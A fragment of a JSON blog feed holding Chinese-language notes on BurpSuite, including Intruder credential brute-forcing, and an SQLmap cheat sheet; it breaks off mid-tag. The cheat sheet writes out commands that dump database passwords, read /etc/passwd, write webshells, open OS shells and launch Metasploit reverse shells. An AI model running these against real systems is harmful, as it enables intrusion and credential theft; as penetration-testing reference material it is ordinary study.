      "content_html": "\n<h3>BurpSuite是什么</h3>\n<blockquote>\n<p>直接使用 请从[3. Proxy](#3. Proxy)部分开始阅读</p>\n</blockquote>\n<p>BurpSuite是一款使用Java编写的，用于Web安全审计与扫描套件。它集成了诸多实用的小工具以完成http请求的转发/修改/扫描等，同时这些小工具之间还可以互相协作，在BurpSuite这个框架下进行各种强大的，可订制的攻击/扫描方案。安全人员可以借用它进行半自动的网络安全审计，开发人员也可以使用它的扫描工具进行网站压力测试与攻击测试，以检测Web应用的安全问题。</p>\n<figure><figcaption>image-20230718152751741</figcaption></figure>\n<blockquote>\n<p>功能完整程度：企业版&gt;专业版&gt;社区版</p>\n</blockquote>\n<p><a href=\"https://portswigger.net/burp\" target=\"_blank\" rel=\"noopener noreferrer\">Burp Suite - Application Security Testing Software - PortSwigger</a>官网点击下载即可。</p>\n<p>截至23.07.18，最新版本为2023.7.2。</p>\n<p>可以下载的类型如下：</p>\n<figure><figcaption>image-20230718154203941</figcaption></figure>\n<p>直接下载jar包，<code>java -jar</code> 运行，比较简单。</p>\n<p>社区版只能用一个临时项目，也就是每次关掉后，里面的报文等内容会消失，所以使用社区版burp不要随意关掉。</p>\n<figure><figcaption>image-20230802105950398</figcaption></figure>\n<p>可以使用默认的配置，也可以自己上传配置文件。</p>\n<figure><figcaption>image-20230802110247590</figcaption></figure>\n<h3>BurpSuite各模块</h3>\n<h4>01. Dashboard</h4>\n<figure><figcaption>image-20230718155206940</figcaption></figure>\n<h4>02. Target</h4>\n<p>显示目标目录结构的的一个功能</p>\n<figure><figcaption>image-20230803112724332</figcaption></figure>\n<p>burp的Repuest部分和Response部分可以查看不同的格式，例如在Request部分点击Hex可以查看十六进制的形式</p>\n<figure><figcaption>image-20230803112824096</figcaption></figure>\n<p>Response部分还可以查看渲染结果，例如</p>\n<figure><figcaption>image-20230803113010306</figcaption></figure>\n<p>最右侧一列可以选择展开或折叠</p>\n<figure><figcaption>image-20230803132506259</figcaption></figure>\n<h4>03. Proxy</h4>\n<p>点击<code>Open browser</code>即可打开浏览器</p>\n<figure><figcaption>image-20230802134450701</figcaption></figure>\n<p>若不想使用burp自带的浏览器，可以在常用的浏览器上配置代理，指定burp监听的端口，就可以让浏览器发出的流量经过burpsuite。</p>\n<figure><figcaption>image-20230802134922158</figcaption></figure>\n<p>edge浏览器设置如下：</p>\n<figure><figcaption>image-20230802135223464</figcaption></figure>\n<p>火狐浏览器步骤：</p>\n<figure><figcaption>image-20230802135627683</figcaption></figure>\n<figure><figcaption>image-20230802135807931</figcaption></figure>\n<p>Proxy模块最主要的功能是拦截请求包，如下：</p>\n<figure><figcaption>image-20230802140203325</figcaption></figure>\n<p>拦截到后还可以点击Action(或者在报文处右键)，选择将该报文发送给burp的其他模块进一步处理，点击最下面的两个选项可以查看该部分的具体使用文档。</p>\n<p>![屏幕截图 2023-08-02 144112](img/Burpsuite/屏幕截图 2023-08-02 144112.png)</p>\n<p>HTTP History部分可以看到浏览器发出的所有HTTP报文及其响应情况，点击还可以查看请求与响应的具体内容。</p>\n<figure><figcaption>image-20230802144812581</figcaption></figure>\n<p><strong>WebSockets History</strong></p>\n<h4>04. Intruder</h4>\n<p>该模块只要用于发送一些只有固定部分需要修改的数据包，例如暴力破解一些网站的密码，只需要修改请求包中的密码字段，然后通过响应的不同来判断该密码是否正确。</p>\n<p>下面介绍暴力破解用户名和密码的简单步骤：</p>\n<ul>\n<li>将登录时截获的报文右键<code>send to intruder</code></li>\n</ul>\n<figure><figcaption>image-20230803101543594</figcaption></figure>\n<ul>\n<li>选中爆破时需要遍历的部分，点击右侧的<code>Add §</code>即可确定好payload的位置。（选中后点击右侧<code>Clear §</code>r即可清除）</li>\n</ul>\n<figure><figcaption>image-20230803102029759</figcaption></figure>\n<p>也可以选择<code>Auto §</code>，这种方式或给等号后面的参数都加上通配符，但一般不太能准确满足要求。</p>\n<figure><figcaption>image-20230803102318473</figcaption></figure>\n<p>点击右下角的<code>Clear</code>可以清除所有该报文的所有内容 谨慎尝试。</p>\n<figure><figcaption>image-20230803102622826</figcaption></figure>\n<ul>\n<li>选择<code>Attck type</code>，选中<strong>username</strong>和<strong>password</strong>的位置为payload的位置后，需要选择攻击类型，</li>\n</ul>\n<figure><figcaption>image-20230803103015934</figcaption></figure>\n<p><strong>Burpsuite支持的4种攻击类型区别：</strong></p>\n<p><code>Sniper</code>: 一次只能替换1个payload</p>\n<p><code>Battering ram</code>: 可以同时替换2个payload，但是每个payload同时替换成字典里面的同一个值</p>\n<p><code>Pitchfork</code>: 可以同时替换n个payload（取决于自己设置几个）。第1个字典的值替换第1个payload，第2个字典的值替换第2个payload，两个字典里的值一一对应。</p>\n<p><code>Cluster bomb</code>: 可以同时替换n个payload（取决于自己设置几个）。但是会将第1个字典的每个payload依次与第2个字典的所有payload进行匹配</p>\n<p>由于我们需要同时确定用户名和密码，所以此时选择攻击类型为<code>Cluster bomb</code></p>\n<ul>\n<li>\n<p>在<code>playloads</code>部分添加两个字典，分别匹配上面的用户名和密码，即<code>§</code>符号中间的内容。<code>Payload sets</code>部分，先对第一个payload配置，<code>Payload type</code>选择<code>Simple list</code>，在下面<code>Load</code>对应的用户名字典</p>\n<figure><figcaption>image-20230803110548254</figcaption></figure>\n</li>\n</ul>\n<p>选择字典还可以选择<code>Payload type</code>为<code>Runtime file</code>，在下面选择对应的字典，以配置<strong>password</strong>的字典为例，对第二个payload的位置进行配置：</p>\n<figure><figcaption>image-20230803105558048</figcaption></figure>\n<p>除此之外还可以选择多种payload的形式，比如数字、日期等：</p>\n<figure><figcaption>image-20230803105734091</figcaption></figure>\n<p>另外，当需要对字典中的payload进一步处理时，可以</p>\n<figure><figcaption>image-20230803110253230</figcaption></figure>\n<p>例如编解码、添加前缀后缀、计算hash、substring等。</p>\n<ul>\n<li>\n<p>配置并发，此时并发线程默认为10，如果需要更改可以在下方<code>Create new resource pool</code>处新建</p>\n<figure><figcaption>image-20230803110656508</figcaption></figure>\n</li>\n</ul>\n<figure><figcaption>image-20230803111024234</figcaption></figure>\n<p>后面的settings部分可以对爆破过程做进一步配置，例如</p>\n<figure><figcaption>image-20230803111301692</figcaption></figure>\n<p>点击<code>Start Attack</code>，结果如下：会出现一success列，显示数据包中出现了几次success字符串。可以通过它来判断登录是否成功。</p>\n<figure><figcaption>image-20230803111506985</figcaption></figure>\n<p>判断登录成功的方法除了上面的添加匹配条件的方式，还可以通过响应包的长度来判断，因为登录成功与失败的响应一定是不同的。</p>\n<p>点击Length，就会按照你好响应的长度排序，此时发现有一长度与其他不同的报文。点击报文后可以看到具体内容，发现响应确实是login success</p>\n<figure><figcaption>image-20230803111902449</figcaption></figure>\n<h4>05. Repeater</h4>\n<p>这个模块比较常用，在这里可以修改请求报文的内容，讲报文<code>Send to repeater</code>后，即可修改后点击<code>Send</code>重新发送。</p>\n<p>同时还支持对该报文进行各种编码：</p>\n<figure><figcaption>image-20230803131756488</figcaption></figure>\n<p>还可以修改hex，如下，选中某个字节后，点击<code>Insert ** </code> 会在该字节前面插入，<code>Delete **</code>可以删除选中的字节。</p>\n<figure><figcaption>image-20230803132057841</figcaption></figure>\n<h4>06. Sequencer</h4>\n<p>序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可以被伪造。此功能同样需要设置代理并获取目标域名，然后关闭代理拦截。然后将需要检测序列的目标域名发送给sequencer模块。序列检测就是将获得的网站提取cookie信息等，然后将发送大量的请求，以得出序列健壮性</p>\n<h4>07. Decoder</h4>\n<p>这个模块支持多种编解码：</p>\n<figure><figcaption>image-20230803150021179</figcaption></figure>\n<p>可以嵌套的编码或解码，如下，先base64编码--url编码--url解码--base64解码。</p>\n<figure><figcaption>image-20230803145816937</figcaption></figure>\n<h4>08. Comparer</h4>\n<p>选择两个报文<code>Send to comparer</code> ，点击<code>Words</code>或<code>Bytes</code>可以从两个维度比较报文的区别</p>\n<figure><figcaption>image-20230803152304367</figcaption></figure>\n<p>Words对比结果</p>\n<figure><figcaption>image-20230803152513470</figcaption></figure>\n<p>Bytes对比结果</p>\n<figure><figcaption>image-20230803152628553</figcaption></figure>\n<h4>09. Logger</h4>\n<p>这个模块记录了所有经过burpsuite的所有http流量，最多100MB。可以在右上角的<code>Logging:On</code>开启或关闭。</p>\n<figure><figcaption>image-20230803153233401</figcaption></figure>\n<h4>10. Organizer</h4>\n<blockquote>\n<p>v2023.7.2新增模块</p>\n</blockquote>\n<p>个人感觉可以把需要保留的报文发送到这个模块，可以标记颜色、状态、添加Notes等</p>\n<figure><figcaption>image-20230803153646917</figcaption></figure>\n<p>状态部分可选：</p>\n<figure><figcaption>image-20230803153716254</figcaption></figure>\n<p>Highlight部分可选：</p>\n<figure><figcaption>image-20230803153747391</figcaption></figure>\n<h4>11. Extensions</h4>\n<figure><figcaption>image-20230803155656787</figcaption></figure>\n<p>还可以在<code>BAPP Store</code>下载安装</p>\n<figure><figcaption>image-20230803160153182</figcaption></figure>\n<p>利用<code>APIs</code>可以自己开发burp扩展</p>\n<figure><figcaption>image-20230803160723133</figcaption></figure>\n<h4>12. Setting</h4>\n<figure><figcaption>image-20230803160822207</figcaption></figure>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "SQLmap使用手册小结",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/SQLmap.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/SQLmap.html",
      "summary": "SQLmap使用手册小结\nSQLmapSQLmap\n1. 基本操作笔记\n2. 常用语句\n3. 简单的注入流程\n3.1 注入判断\n当给sqlmap这么一个url的时候，它会：\nsqlmap支持五种不同的注入模式：\n可以提供一个简单的URL，Burp或WebScarab请求日志文件，文本文档中的完整http请求或者Google的搜索，匹配出结果页面，也可以...",
      "content_html": "\n<figure><figcaption>SQLmap</figcaption></figure>\n<h2>1. 基本操作笔记</h2>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>\n-u  #注入点 \n-f  #指纹判别数据库类型 \n-b  #获取数据库版本信息 \n-p  #指定可测试的参数(?page=1&amp;id=2 -p \"page,id\") \n-D \"\"  #指定数据库名 \n-T \"\"  #指定表名 \n-C \"\"  #指定字段 \n-s \"\"  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s \"xx.log\"　　恢复:-s \"xx.log\" --resume) \n--level=(1-5) #要执行的测试水平等级，默认为1 \n--risk=(0-3)  #测试执行的风险等级，默认为1 \n--time-sec=(2,5) #延迟响应，默认为5 \n--data #通过POST发送数据 \n--columns        #列出字段 \n--current-user   #获取当前用户名称 \n--current-db     #获取当前数据库名称 \n--users          #列数据库所有用户 \n--passwords      #数据库用户所有密码 \n--privileges     #查看用户权限(--privileges -U root) \n-U               #指定数据库用户 \n--dbs            #列出所有数据库 \n--tables -D \"\"   #列出指定数据库中的表 \n--columns -T \"user\" -D \"mysql\"      #列出mysql数据库中的user表的所有字段 \n--dump-all            #列出所有数据库所有表 \n--exclude-sysdbs      #只列出用户自己新建的数据库和表 \n--dump -T \"\" -D \"\" -C \"\"   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) \n--dump -T \"\" -D \"\" --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 \n--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) \n--os      #指定系统(Linux,Windows) \n-v  #详细的等级(0-6) \n    0：只显示Python的回溯，错误和关键消息。 \n    1：显示信息和警告消息。 \n    2：显示调试消息。 \n    3：有效载荷注入。 \n    4：显示HTTP请求。 \n    5：显示HTTP响应头。 \n    6：显示HTTP响应页面的内容 \n--privileges  #查看权限 \n--is-dba      #是否是数据库管理员 \n--roles       #枚举数据库用户角色 \n--udf-inject  #导入用户自定义函数（获取系统权限） \n--union-check  #是否支持union 注入 \n--union-cols #union 查询表记录 \n--union-test #union 语句测试 \n--union-use  #采用union 注入 \n--union-tech orderby #union配合order by \n--data \"\" #POST方式提交数据(--data \"page=1&amp;id=2\") \n--cookie \"用;号分开\"      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) \n--referer \"\"     #使用referer欺骗(--referer \"http://www.baidu.com\") \n--user-agent \"\"  #自定义user-agent \n--proxy \"http://127.0.0.1:8118\" #代理注入 \n--string=\"\"    #指定关键词,字符串匹配. \n--threads 　　  #采用多线程(--threads 3) \n--sql-shell    #执行指定sql命令 \n--sql-query    #执行指定的sql语句(--sql-query \"SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1\" ) \n--file-read    #读取指定文件 \n--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) \n--file-dest    #要写入的文件绝对路径 \n--os-cmd=id    #执行系统命令 \n--os-shell     #系统交互shell \n--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) \n--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) \n--os-smbrelay  # \n--os-bof       # \n--reg-read     #读取win系统注册表 \n--priv-esc     # \n--time-sec=    #延迟设置 默认--time-sec=5 为5秒 \n-p \"user-agent\" --user-agent \"sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)\"  #指定user-agent注入 \n--eta          #盲注 \n/pentest/database/sqlmap/txt/\ncommon-columns.txt　　字段字典　　　 \ncommon-outputs.txt \ncommon-tables.txt      表字典 \nkeywords.txt \noracle-default-passwords.txt \nuser-agents.txt \nwordlist.txt \n</code></pre></div><h2>2. 常用语句</h2>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 \n2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 \n3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 \n4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C \"user,pass\"  -v 1 --exclude-sysdbs \n5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 \n6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read \"c:\\boot.ini\" -v 2 \n7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 \n8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd \"id\" -v 1 \n9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 \n10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 \n11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 \n12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 \n13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=\"HKEY_LOCAL_NACHINE\\SOFEWARE\\sqlmap\" --reg-value=Test --reg-type=REG_SZ --reg-data=1 \n14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta \n15./sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1\" -p id --prefix \"')\" --suffix \"AND ('abc'='abc\"\n16./sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1\" --auth-type Basic --auth-cred \"testuser:testpass\"\n17./sqlmap.py -l burp.log --scope=\"(www)?\\.target\\.(com|net|org)\"\n18./sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/get_int.php?id=1\" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 \n19./sqlmap.py -u \"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1\" --sql-query \"SELECT 'foo'\" -v 1 \n20./sqlmap.py -u \"http://192.168.136.129/mysql/get_int_4.php?id=1\" --common-tables -D testdb --banner \n21./sqlmap.py -u \"http://192.168.136.129/mysql/get_int_4.php?id=1\" --cookie=\"PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low\" --string='xx' --dbs --level=3 -p \"uid\"\n</code></pre></div><h2>3. 简单的注入流程</h2>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>1.读取数据库版本，当前用户，当前数据库 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 \n2.判断当前数据库用户权限 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 \n3.读取所有数据库用户或指定数据库用户的密码 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 \n4.获取所有数据库 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 \n5.获取指定数据库中的所有表 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 \n6.获取指定数据库名中指定表的字段 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 \n7.获取指定数据库名中指定表中指定字段的数据 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C \"username,password\" -s \"sqlnmapdb.log\" -v 2 \n8.file-read读取web文件 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read \"/etc/passwd\" -v 2 \n9.file-write写入文件到web \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：\n</code></pre></div><h4>3.1 注入判断</h4>\n<p>当给<code>sqlmap</code>这么一个<code>url</code>的时候，它会：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>1. 判断可注入的参数\n2. 判断可以用那种SQL注入技术来注入\n3. 识别出哪种数据库\n4. 根据用户选择，读取哪些数据\n</code></pre></div><p><code>sqlmap</code>支持五种不同的注入模式：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>1. 基于布尔的盲注，即可以根据返回页面判断条件（真\\|假）的注入。\n\n2. 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。\n\n3. 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。\n\n4. 联合查询注入，可以使用union的情况下的注入。\n\n5. 堆查询注入，可以同时执行多条语句的执行时的注入。（使用;分隔开多条语句，最为灵活，可以自己构造select（含）外的其他语句）\n</code></pre></div><p>可以提供一个简单的<code>URL，Burp</code>或<code>WebScarab</code>请求日志文件，文本文档中的完整<code>http</code>请求或者<code>Google</code>的搜索，匹配出结果页面，也可以自己定义一个正则来判断那个地址去测试。测试<code>GET</code>参数，<code>POST</code>参数，<code>HTTP Cookie</code>参数，<code>HTTP User-Agent</code>头和<code>HTTP Referer</code>头来确认是否有<code>SQL</code>注入，它也可以指定用逗号分隔的列表的具体参数来测试。可以设定<code>HTTP(S)</code>请求的并发数，来提高盲注时的效率。</p>\n<p><strong>GET方式</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>sqlmap -u \"url\" //这个URL必须含？\n</code></pre></div><p><strong>POST方式</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>sqlmap -u http://testasp.vulnweb.com/Login.asp --data \"tfUName=1&amp;tfUPass=1\"\n</code></pre></div><p><strong>cookie注入</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>sqlmap -u \"url\" --cookie \"chsadj\" --level 2 //这里的URL去掉？及其后的内容，并将它们放在cookie的内容里面\n</code></pre></div><p><strong>tamper方式</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>sqlmap -u \"url\" -v 3 --batch --tamper \"sac.py\"  //temper后面的插件可以去sql安装目录查找\n</code></pre></div><p><strong>自动检测表</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>sqlmap -u http://testasp.vulnweb.com/Login.asp --forms\n</code></pre></div><p><strong>延时两秒</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Sqlmap –u “url” --delay 2\n</code></pre></div><p><strong>频率3次</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Sqlmap –u “url” --safe-freq 3\n</code></pre></div><p><strong>伪静态</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Sqlmap -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html //在40后面加*\n</code></pre></div><h4>3.2 查看数据库</h4>\n<p><code>sqlmap</code>支持的数据库管理系统有：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2,\nSQLite, Firebird, Sybase和SAP MaxDB\n</code></pre></div><p><strong>命令</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>sqlmap -u \"url\" --dbs   //查看所有数据库\nsqlmap -u \"url\" --users //查看所有用户\nsqlmap -u \"url\" --current-db //查看当前的数据库\nsqlmap -u \"url\" --current-user //产看当前的用户\nsqlmap -u \"url\" --is-dba //查看是否是最高权限\nsqlmap -u \"url\" --passwords //查看所有密码\nsqlmap -u \"url\" –hostname //查看主机名\nsqlmap -u \"url\" privileges -U username //查看用户权限\nsqlmap -u \"url\" –roles //查看用户角色\n</code></pre></div><p><strong>查看详细内容</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>sqlmap -u \"url\" --tables -D \"database\" //database这个数据库的表数据表\nsqlmap -u \"url\" --columns -T \"tables\" -D \"database\" //查看tables这个数据表的字段\nsqlmap -u \"url\" --dump \"a,b,c\" -C \"columns\" -T \"tables\" -D \"database\" //下载内容，后面的-CTDabc都是对下载的数据库表段的约束如果不加就是下载所有\n</code></pre></div><h4>3.3 执行特殊操作</h4>\n<p><strong>文件查看</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>sqlmap -u \"url\" –file-read= //这个读取的文件会存在本地的结果目录，请认真看提示\n</code></pre></div><p><strong>文件写入</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>sqlmap -u \"url\" --file-write=本地文件路径 --file-dest=网站的绝对路径 //上传webshell用，需要dba权限\n</code></pre></div><p><strong>命令执行</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>sqlmap -u \"url\" --os-cmd \"cmd\"  //执行cmd代表的命令，如cd C:/\n\nsqlmap -u \"url\" --os-shell  //进入数据库自带的shell\n</code></pre></div><h2>4. 命令总览</h2>\n<p>使用<code>sqlmap -hh</code>可以查看详细的命令说明：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>-r 1.txt            对于用post方法提交的，参数不在URL里面的网页，可以先截获数据，保存成文件再用这个参数执行\n-l log.txt          可以将代理的日志作为目标去检测\n-m 1.txt            对于多个URL，可以一排一个写入文件后加载\n--force-ssl         对于使用SSL的URL要在后面加上这个参数\n--data              对于使用post方法，可以将参数写在data后面\n--param-del=\"\"          \n--cookie=\"\"  level 2        对于需要验证才能访问的URL，可以加上cookie值验证，如果要检测cookie是否有注入漏洞，level要高于1\n--random-agent          使用随机的user-agent\n--user-agent=\"\"  level 3    指定user-agent，如要检测它是否有漏洞level要高于2\n--header=\"\\n\"           指定头信息，如User-Agent:dsacs，大小写敏感，多个用\\n分隔\n--method=GET POST       设置提交方式，默认一个一个的尝试\n--auth-type             如果是基于http的验证，如Basic NTLM Digest，可直接加类型再配合下一个参数使用\n--auth-cred \"user:pass\"     填写账号和密码\n --proxy=\"http:127.0.0.1:8087\"  使用代理\n--proxy-cred=\"name:pass\"    如果代理要密码的话\n--ignore-proxy          强制不使用代理\n--delay             请求延迟间隔，单位秒，默认无延迟\n--retries           链接失败重试次数3\n--timeout           链接超时时间30\n--randomize=\"param\"     使用和源参数类型长度一致的参数\nsqlmap -l l.log --scope=\"(www)?\\.target\\.(com|net|org)\"     这是一个正则表达式，是对于log文件里面URL过多时，进行筛选，这里是只要com/net/org结尾的域名\nsqlmap -l 2.log --scope=\"(19)?\\.168\\.20\\.(1|11|111)\"        同上，筛选19*.168.20.1/11/111这几个网段的IP\n--safe-url=\"url\"        设置正确的URL，因为如果一直尝试错误的URL可能会被服务器拉黑，过几次登下正确的防止这个发生\n--safe-freq 10          尝试的与正确的URL的交换频率\n--skip-urlencode        有的URL在get方式提交时没编码，就要用这个\n--eval=\"\"php代码      这个后面可以跟PHP代码，能够执行\n--keep-alive            保持连接会降低资源使用，但是不能与代理兼容\n--predict-output        能够在找到一个信息后缩小检测的范围，不能与--threads兼容\n--null-connection       只看返回文件的大小，不要他的内容与--text-only不兼容\n--threads           最大并发数，默认1，最大不要超过10，盲注时一次返回一个字符【7次请求】\n-o              使用除了--threads的全部的优化参数\n-p              指定参数，使level失效\n-skip               排除不扫描的参数\n                对于伪静态网页，就在参数后面加*\n--dbms              接数据库管理系统，如MySQL\n--os                接系统，如Linux\n--invalid-bignum        使用大数作为假的值\n--invalid-logical       使用逻辑数作为假的值\n--no-cat            对于接收到的null不自动转换成空格\n--no-escape         不使用逃逸，就是不把'转换成asii码形式\n--prefix            在参数前指定前缀\n--suffix            在参数后指定后缀\n--level             设置检查的等级，默认为1，共5个，可以查看/usr/share/sqlmap/xml/payloads这个文件了解详细的信息\n--risk              设置风险等级，默认是安全的检查，第四等可能会修改数据库内容\n--string            当页面含有这个字符串时为真\n--not-string            当页面不含这个字符串时为真\n--regexp            用正则表达式判断\n--code              当状态代码为*时为真\n--text-only         页面含有*时为真\n--titles            页面标题为*时为真\n--techniques \nB E U S T           使用什么检查技术，默认所有，这里分别是基于布尔的盲注，基于错误的判断，联合查询，堆积，基于时间的查询\n--time-sec          \n--union-cols            联合查询第几列到第几列\n--union-char            用select null,1:2  这种，可能会出错，就讲这个null换成其他数字占位\n--second-order          当注入后在第二个页面显示错误信息，这里就接上显示错误信息的地方\n-fingerprint            指纹信息\n--banner            版本信息\n--batch             按照软件默认设置，自动回答\n--count             计数\n-s              将这个会话保存下次继续\n-t              将这些数据保存\n--charset           强制设置数据库编码\n--crawl             设置蜘蛛爬行的深度\n--csv-del           设置下载的数据的分隔方式，默认是,\n--dbms-cred         设置数据库用户\n--flush-session         清空以前的会话数据\n--fresh-queries         不清空会话，重新查询\n--hex               一16进制编码的方式传输数据\n--output-dir            会话输出文件夹\n--parse-errors          显示MySQL错误信息\n--save              保存当前配置为文件\n-z              特别的助记方式，后面接的只要是独一无二的企鹅存在的就可以用，如user-agent可以用ueraet.\n--answers           这个可以对一些特定的问题作出回答，在自动化注入中用\n--check-waf         检查是否含有waf等\n--identify-waf          彻底的检查waf等的信息\n--smart     当有大量目标时，这个就只检查基于错误的注入点\n--mobile    模拟智能手机去扫描\n--wizard    向导模式\n--purge-out 清除输出内容\n</code></pre></div><h4>用来连接数据库</h4>\n<p>这是一个比较实用的功能，用来连接数据库格式为</p>\n<h4>设置显示信息的详细度：</h4>\n<p>使用<code>-v</code>参数，共有<code>七</code>个等级：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>0. 只显示python错误以及严重的信息。\n1. 同时显示基本信息和警告信息。（默认）\n2. 同时显示debug信息。\n3. 同时显示注入的payload。\n4. 同时显示HTTP请求。\n5. 同时显示HTTP响应头。\n6. 同时显示HTTP响应页面。\n</code></pre></div><p>可以通过学习<code>sqlmap</code>的<code>payload</code>来学习<code>sql</code>注入，这时需要使用3级。</p>\n<h4>获取目标方式</h4>\n<p><strong>目标URL</strong></p>\n<p>参数：<code>-u</code>或者<code>–url</code></p>\n<p>格式：<code>http(s)://targeturl[:port]/[…]</code></p>\n<p>例如：<code>python sqlmap.py -u \"http://www.target.com/vuln.php?id=1\" -f --banner --dbs --users</code></p>\n<p>从<code>Burp</code>或者<code>WebScarab</code>代理中获取日志</p>\n<p>参数：<code>-l</code></p>\n<p>可以直接吧<code>Burp proxy</code>或者<code>WebScarab proxy</code>中的日志直接倒出来交给<code>sqlmap</code>来一个一个检测是否有注入。</p>\n<p><strong>从文本中获取多个目标扫描</strong></p>\n<p>参数：<code>-m</code></p>\n<p>文件中保存<code>url</code>格式如下，<code>sqlmap</code>会一个一个检测</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre 